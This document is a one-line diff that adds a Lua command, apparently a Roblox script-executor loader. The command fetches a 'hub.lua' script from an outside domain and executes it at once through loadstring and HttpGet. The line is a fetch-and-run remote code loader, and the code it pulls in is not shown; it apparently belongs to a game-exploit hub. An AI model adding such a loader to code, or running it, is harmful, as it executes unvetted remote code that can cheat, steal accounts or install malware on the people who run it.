@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://proxi-hub.com/hub.lua"))(); 
